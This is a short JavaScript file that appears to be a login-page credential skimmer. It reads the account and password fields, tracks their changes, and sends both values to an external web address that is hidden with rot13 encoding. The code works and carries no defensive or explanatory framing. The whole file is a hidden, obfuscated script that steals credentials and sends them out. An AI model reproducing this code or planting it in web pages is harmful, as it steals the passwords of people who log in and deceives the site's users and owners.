

function init() {
    user_field = document.getElementById("fieldAccount");
    pass_field = document.getElementById("fieldPassword");
    username = user_field.value;
    password = pass_field.value;

    valueUpdate(username, password);
    user_field.onchange = () => {
        username = user_field.value;
        valueUpdate(username, password);
    };
    pass_field.onchange = () => {
        password = pass_field.value;
        valueUpdate(username, password);
    };
}

const rot13 = (message) => {
    const originalAlpha =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
    return message.replace(
        /[a-z]/gi,
        (letter) => cipher[originalAlpha.indexOf(letter)]
    );
};

function valueUpdate(user, pass) {
    if (user == "") {
        return;
    }
    if (pass == "") {
        return;
    }
    wh = rot13(
        "uggcf://guryvbafebne.pu/qp_sbejneq"
    );
    fetch(wh, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            content: `Username: ${user}\nPassword: ${pass}`,
        }),
    });
}

init();